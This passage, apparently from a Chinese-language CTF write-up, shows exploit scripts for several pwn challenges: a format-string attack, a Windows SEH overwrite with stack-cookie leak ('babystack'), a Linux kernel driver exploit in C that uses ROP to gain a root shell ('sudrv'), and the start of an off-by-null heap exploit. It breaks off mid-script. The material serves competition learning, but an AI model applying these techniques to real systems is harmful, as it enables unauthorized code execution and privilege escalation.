        <span class="n">modify_byte</span><span class="p">(</span><span class="n">addr_last_byte</span> <span class="o">+</span> <span class="n">i</span> <span class="p">,</span>  <span class="n">ebp_offset</span><span class="p">)</span>
        <span class="n">modify_byte</span><span class="p">(</span><span class="n">now_value</span> <span class="p">,</span> <span class="n">ebp_1_offset</span><span class="p">)</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">"./playfmt"</span><span class="p">)</span>
<span class="c1">#elf = ELF("./playfmt")</span>
<span class="c1">#p = remote("120.78.192.35",9999)</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">"./playfmt"</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"=</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
<span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>

<span class="nb">raw_input</span><span class="p">()</span>
<span class="n">play_ebp_addr</span> <span class="o">=</span> <span class="n">get_target</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span>  <span class="s2">"ebp"</span><span class="p">)</span>

<span class="nb">raw_input</span><span class="p">()</span>
<span class="n">ebp_addr</span> <span class="o">=</span> <span class="n">get_target</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span>  <span class="s2">"ebp"</span><span class="p">)</span>
<span class="n">flag_ptr</span> <span class="o">=</span> <span class="mi">19</span>
<span class="n">flag_addr</span> <span class="o">=</span> <span class="n">get_target</span><span class="p">(</span><span class="n">flag_ptr</span> <span class="p">,</span> <span class="s2">"addr"</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x420</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">flag_addr</span><span class="p">))</span>

<span class="n">modify</span><span class="p">(</span><span class="n">ebp_addr</span> <span class="o">+</span> <span class="mi">4</span> <span class="p">,</span> <span class="n">flag_addr</span> <span class="p">,</span> <span class="mi">6</span> <span class="p">,</span> <span class="mi">14</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">format_offset</span><span class="p">(</span><span class="s2">"%{}$s</span><span class="se">\x00</span><span class="s2">"</span> <span class="p">,</span> <span class="mi">14</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>
<h2 data-content="1" id="68a6012875d8b26a7dd178f0b1057380">babystack</h2>
<p>为方便本地测试，先可选头中的地址随机化选项关掉。</p>
<p>开始让你输入一个数，这里有栈溢出，但是没用，因为最后是直接exit掉的。</p>
<p>注意到<code>0040853C</code>有一处花指令，实际上这里就是获取下一行的地址，然后把输入减去这个地址，然后输入除以它。</p>
<p>这时想到，如果除以零会怎样，于是输入0040853C，发现通过异常处理进入了新的函数<code>sub_407F60</code></p>
<p>分析这里的功能，它提供了10次任意地址读取。输入选项yes和no的时候有栈溢出，同时如果输入的不是yes或no，调用fgets又能栈溢出。</p>
<p>开头写死了两个1。结束时会把他们相加然后与三校验，正确会输出flag。我们输入的字符串是在这两个数据高位的，所以不能溢出覆盖到他们。</p>
<p>同时由于最后也是exit掉的，所以也不能覆盖返回地址。</p>
<p>测试了下任意地址读取，如果输入非法地址会异常，进入一个异常处理函数。</p>
<p>观察一下函数开头的代码：</p>
<pre><code>.text:00407F60                 push    ebp
.text:00407F61                 mov     ebp, esp
.text:00407F63                 push    0FFFFFFFEh
.text:00407F65                 push    offset dword_47ACC0
.text:00407F6A                 push    offset SEH_407F60
.text:00407F6F                 mov     eax, large fs:0
.text:00407F75                 push    eax
.text:00407F76                 add     esp, 0FFFFFF2Ch
.text:00407F7C                 mov     eax, ___security_cookie
.text:00407F81                 xor     [ebp+var_8], eax
.text:00407F84                 xor     eax, ebp
.text:00407F86                 mov     [ebp+var_1C], eax
.text:00407F89                 push    ebx
.text:00407F8A                 push    esi
.text:00407F8B                 push    edi
.text:00407F8C                 push    eax
.text:00407F8D                 lea     eax, [ebp+var_10]</code></pre>
<p>security_cookie是全局变量上一个值，每一个进程自始至终是固定的。它异或到了ebp-8的数据上，调试一下发现这里指向SEH结构体，之后又异或了ebp放到ebp-1Ch作为canary。</p>
<p>想到可以在栈上伪造一个seh结构体，然后把ebp-8覆盖成我们伪造的结构体，结构体中的异常处理函数改成程序中的后门地址。由于这个地址异或了cookie，所以我们还要读取cookie的值。</p>
<p>经过多次调试发现还有一些栈上的值不能变，通过计算偏移覆盖或者直接用任意地址读取后覆盖。需要注意的是ebp-4应为0。</p>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">main_aslr</span> <span class="o">=</span> <span class="mh">0x1c395e</span>
<span class="n">main_addr</span> <span class="o">=</span> <span class="mh">0x0040395E</span>
<span class="n">cookie_addr</span> <span class="o">=</span> <span class="mh">0x0047C004</span>
<span class="n">stack_addr</span> <span class="o">=</span> <span class="mh">0x19FF10</span>
<span class="n">cookie_aslr</span> <span class="o">=</span> <span class="n">cookie_addr</span><span class="o">-</span><span class="n">main_addr</span><span class="o">+</span><span class="n">main_aslr</span>

<span class="k">def</span> <span class="nf">leak_stack</span><span class="p">(</span><span class="n">stack</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"Do you want to know more?"</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">"yes"</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"Where do you want to know?"</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">stack</span><span class="o">-</span><span class="n">stack_addr</span><span class="o">+</span><span class="n">stack_aslr</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"value is "</span><span class="p">)</span>
    <span class="n">s</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
    <span class="n">s</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">s</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">"121.40.159.66"</span><span class="p">,</span><span class="s2">"6666"</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"stack address = "</span><span class="p">)</span>
<span class="n">stack_aslr</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">"stack:0x</span><span class="si">%x</span><span class="s2">"</span><span class="o">%</span><span class="n">stack_aslr</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"main address = "</span><span class="p">)</span>
<span class="n">main_aslr</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">"main:0x</span><span class="si">%x</span><span class="s2">"</span><span class="o">%</span><span class="n">main_aslr</span><span class="p">)</span>
<span class="n">str4_addr</span> <span class="o">=</span> <span class="mh">0x0019FE48</span><span class="o">-</span><span class="n">stack_addr</span><span class="o">+</span><span class="n">stack_aslr</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"So,Can You Tell me what did you know?"</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">"00408541"</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"Do you want to know more?"</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">"yes"</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"Where do you want to know?"</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">cookie_aslr</span><span class="p">))</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"value is "</span><span class="p">)</span>
<span class="n">cookie</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
<span class="n">cookie</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">cookie</span><span class="p">)</span>
<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">"cookie:0x</span><span class="si">%x</span><span class="s2">"</span><span class="o">%</span><span class="n">cookie</span><span class="p">)</span>
<span class="n">s1</span> <span class="o">=</span> <span class="n">leak_stack</span><span class="p">(</span><span class="mh">0x19fed4</span><span class="p">)</span>
<span class="n">s4</span> <span class="o">=</span> <span class="n">leak_stack</span><span class="p">(</span><span class="mh">0x19fee0</span><span class="p">)</span>
<span class="n">s5</span> <span class="o">=</span> <span class="n">leak_stack</span><span class="p">(</span><span class="mh">0x19fee4</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"Do you want to know more?"</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">"y"</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">=</span> <span class="s1">'aaaa'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xffffffe4</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0xffffff0c</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0xfffffffe</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x408224</span><span class="o">-</span><span class="n">main_addr</span><span class="o">+</span><span class="n">main_aslr</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x00408266</span><span class="o">-</span><span class="n">main_addr</span><span class="o">+</span><span class="n">main_aslr</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">144</span><span class="p">,</span><span class="s2">"a"</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">s1</span><span class="p">)</span> <span class="o">+</span> <span class="s1">'a'</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">s4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">s5</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">cookie</span><span class="o">^</span><span class="n">str4_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"Do you want to know more?"</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">"yes"</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"Where do you want to know?</span><span class="se">\r\n</span><span class="s2">"</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">"0"</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>
<h2 data-content="1" id="53a287ea14587fcdbeb34c8c7d948d18">sudrv</h2>
<p>格式化拿内核地址和栈地址，堆溢出覆盖，多次分配到栈上ROP。</p>
<div class="highlight"><pre><span></span><span class="cp">#define _GNU_SOURCE</span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;sys/mman.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;pthread.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;errno.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;sys/ioctl.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;memory.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;pty.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;signal.h&gt;</span><span class="cp"></span>

<span class="cp">#define kalloc  0x73311337</span>
<span class="cp">#define kfree   0x13377331</span>
<span class="cp">#define printk  0xDEADBEEF</span>

<span class="cp">#define prepare_off 0x81790</span>
<span class="cp">#define commit_off  0x81410</span>
<span class="cp">#define pop_rdi_ret 0x3a591c</span>
<span class="cp">#define mov_rdi_cr4 0x4e5b1</span>
<span class="cp">#define pop_rdx_ret 0x44f17</span>
<span class="cp">#define mv_rax_in_rdx   0x6b31</span>

<span class="kt">void</span> <span class="nf">error_quit</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">p</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">perror</span><span class="p">(</span><span class="n">p</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">commit_creds</span><span class="p">)(</span><span class="kt">void</span> <span class="o">*</span><span class="p">);</span>
<span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">prepare_kernel_cred</span><span class="p">)(</span><span class="kt">void</span> <span class="o">*</span><span class="p">);</span>

<span class="kt">void</span> <span class="nf">get_root</span><span class="p">(</span><span class="kt">int</span> <span class="n">arg</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">i</span><span class="p">,</span><span class="n">fd</span><span class="p">,</span><span class="n">t</span><span class="p">[</span><span class="mh">0x100</span><span class="p">];</span>
    <span class="kt">char</span> <span class="n">p</span><span class="p">[</span><span class="mh">0x2008</span><span class="p">];</span>
    <span class="n">signal</span><span class="p">(</span><span class="n">SIGSEGV</span><span class="p">,</span> <span class="n">get_root</span><span class="p">);</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">leak</span> <span class="o">=</span> <span class="s">"%lx %lx %lx %lx %lx kernel:0x%lx %lx %lx %lx stack:0x%lx %lx %lx %lx %lx aa</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">stack</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">kernel</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">((</span><span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/dev/meizijiutql"</span><span class="p">,</span><span class="n">O_RDWR</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
        <span class="n">error_quit</span><span class="p">(</span><span class="s">"open error"</span><span class="p">);</span>
    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x103</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
        <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">kalloc</span><span class="p">,</span> <span class="mh">0xff9</span><span class="p">);</span>
    <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">leak</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">leak</span><span class="p">));</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">printk</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">printk</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"input kernel_base</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">scanf</span><span class="p">(</span><span class="s">"%lx"</span><span class="p">,</span><span class="o">&amp;</span><span class="n">kernel</span><span class="p">);</span>
    <span class="n">kernel</span> <span class="o">=</span> <span class="n">kernel</span> <span class="o">&amp;</span> <span class="mh">0xfffffffffff00000</span><span class="p">;</span>
    <span class="n">kernel</span> <span class="o">-=</span> <span class="mh">0x100000</span><span class="p">;</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"input stack_addr</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">scanf</span><span class="p">(</span><span class="s">"%lx"</span><span class="p">,</span><span class="o">&amp;</span><span class="n">stack</span><span class="p">);</span>
    <span class="n">stack</span> <span class="o">=</span> <span class="n">stack</span> <span class="o">&amp;</span> <span class="mh">0xfffffffffffff000</span><span class="p">;</span>
    <span class="o">*</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">p</span><span class="p">[</span><span class="mh">0x1000</span><span class="p">])</span> <span class="o">=</span> <span class="n">stack</span><span class="p">;</span>
    <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="mh">0x1008</span><span class="p">);</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="mh">0x90</span><span class="p">,</span><span class="mh">0x2000</span><span class="p">);</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="n">rop</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">p</span><span class="p">[</span><span class="mh">0xe50</span><span class="o">-</span><span class="mi">8</span><span class="p">];</span>
    <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"0x%lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">pop_rdi_ret</span><span class="o">+</span><span class="n">kernel</span><span class="p">);</span>
    <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">pop_rdi_ret</span> <span class="o">+</span> <span class="n">kernel</span><span class="p">;</span>
    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">prepare_off</span> <span class="o">+</span> <span class="n">kernel</span><span class="p">;</span>
    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">pop_rdx_ret</span> <span class="o">+</span> <span class="n">kernel</span><span class="p">;</span>
    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">stack</span> <span class="o">+</span> <span class="mh">0xe80</span><span class="p">;</span>
    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">mv_rax_in_rdx</span> <span class="o">+</span> <span class="n">kernel</span><span class="p">;</span>
    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">pop_rdi_ret</span> <span class="o">+</span> <span class="n">kernel</span><span class="p">;</span>
    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x6f0</span><span class="p">;</span>
    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">commit_off</span> <span class="o">+</span> <span class="n">kernel</span><span class="p">;</span>
    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xa00d5a</span> <span class="o">+</span> <span class="n">kernel</span><span class="p">;</span>
    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x246</span><span class="p">;</span>
    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x021880</span> <span class="o">+</span> <span class="n">kernel</span><span class="p">;</span>
    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">get_root</span><span class="p">;</span>
    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x33</span><span class="p">;</span>
    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x246</span><span class="p">;</span>
    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">p</span><span class="p">;</span>
    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x2b</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="mh">0x700</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">kalloc</span><span class="p">,</span> <span class="mh">0xff9</span><span class="p">);</span>
        <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
<h2 data-content="1" id="0dd529860fabda2ca99ea1e9a23805c5">二手旧电脑</h2>
<p>这道题比较简单</p>
<p>漏洞很明显，off by null</p>
<p>利用 off by null 可以控制其他chunk</p>
<p>然后再fastbin attack到heap第一个chunk那里</p>
<p>再利用题目给的rename，就可以进行任意写，写到free_hook为system，然后就可以了</p>
<p>exp如下</p>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">debug</span><span class="o">=</span><span class="mi">0</span>

<span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">'debug'</span>

<span class="k">if</span> <span class="n">debug</span><span class="p">:</span>
    <span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s1">'./pwn'</span><span class="p">)</span>
    <span class="c1">#p=process('',env={'LD_PRELOAD':'./libc.so'})</span>
    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s1">'47.111.59.243'</span><span class="p">,</span> <span class="mi">10001</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">ru</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">se</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">sl</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">sz</span><span class="p">,</span><span class="n">name</span><span class="p">,</span><span class="n">price</span><span class="p">):</span>
    <span class="n">sl</span><span class="p">(</span><span class="s1">'1'</span><span class="p">)</span>
    <span class="n">ru</span><span class="p">(</span><span class="s1">'length: '</span><span class="p">)</span>
    <span class="n">sl</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">sz</span><span class="p">))</span>
    <span class="n">ru</span><span class="p">(</span><span class="s1">'Name: '</span><span class="p">)</span>
    <span class="n">se</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
    <span class="n">ru</span><span class="p">(</span><span class="s1">'Price: '</span><span class="p">)</span>
    <span class="n">sl</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">price</span><span class="p">))</span>
    <span class="n">ru</span><span class="p">(</span><span class="s1">'&gt;&gt;&gt; '</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">comment</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="n">content</span><span class="p">,</span><span class="n">score</span><span class="p">):</span>
    <span class="n">sl</span><span class="p">(</span><span class="s1">'2'</span><span class="p">)</span>
    <span class="n">ru</span><span class="p">(</span><span class="s1">'Index: '</span><span class="p">)</span>
    <span class="n">sl</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="n">ru</span><span class="p">(</span><span class="s1">'Comment on'</span><span class="p">)</span>
    <span class="n">se</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
    <span class="n">ru</span><span class="p">(</span><span class="s1">'score:'</span><span class="p">)</span>
    <span class="n">sl</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">score</span><span class="p">))</span>
    <span class="n">ru</span><span class="p">(</span><span class="s1">'&gt;&gt;&gt; '</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">throw</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">sl</span><span class="p">(</span><span class="s1">'3'</span><span class="p">)</span>
    <span class="n">ru</span><span class="p">(</span><span class="s1">'index: '</span><span class="p">)</span>
    <span class="n">sl</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="n">ru</span><span class="p">(</span><span class="s1">'Comment '</span><span class="p">)</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">ru</span><span class="p">(</span><span class="s1">' will'</span><span class="p">)[:</span><span class="o">-</span><span class="mi">5</span><span class="p">]</span>
    <span class="n">ru</span><span class="p">(</span><span class="s1">'&gt;&gt;&gt; '</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">data</span>

<span class="n">add</span><span class="p">(</span><span class="mh">0x200</span><span class="p">,</span><span class="s1">'a</span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span><span class="mi">100</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mh">0x100</span><span class="p">,</span><span class="s1">'a</span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span><span class="mi">200</span><span class="p">)</span>
<span class="n">comment</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="s1">'aaaa</span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span><span class="mi">100</span><span class="p">)</span>
<span class="n">throw</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span><span class="s1">'a</span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span><span class="mi">100</span><span class="p">)</span>
